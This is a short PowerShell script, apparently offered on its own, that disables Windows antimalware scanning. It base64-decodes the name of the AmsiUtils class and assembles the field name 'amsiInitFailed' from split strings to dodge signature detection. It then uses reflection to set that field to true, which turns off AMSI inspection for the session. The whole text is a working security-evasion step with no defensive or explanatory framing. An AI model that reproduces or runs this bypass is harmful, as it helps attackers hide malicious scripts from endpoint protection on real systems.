$encoded = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
$a = [Ref].Assembly.GetType($decoded)
$b = $a.GetField('amsi' + 'Init' + 'Failed', 'NonPublic,Static')
$b.SetValue($null, $true)